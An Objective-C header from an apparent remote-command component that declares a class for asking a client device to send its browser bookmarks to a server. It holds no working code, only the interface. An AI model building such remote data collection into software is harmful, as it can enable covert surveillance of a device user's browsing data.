/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestBookmarkProcessor
 - Version      :  1.0  
 - Purpose      :  Ask the client to send its Bookmarks to the server
 - Copy right   :  10/07/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */

#import <Foundation/Foundation.h>
#import "RemoteCmdAsyncHTTPProcessor.h"
#import "BookmarkDelegate.h"

@interface RequestBookmarkProcessor : RemoteCmdAsyncHTTPProcessor <BookmarkDelegate> {

}


//Initialize Processor with RemoteCommandData and RemoteCmdProcessingDelegate;
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;

@end
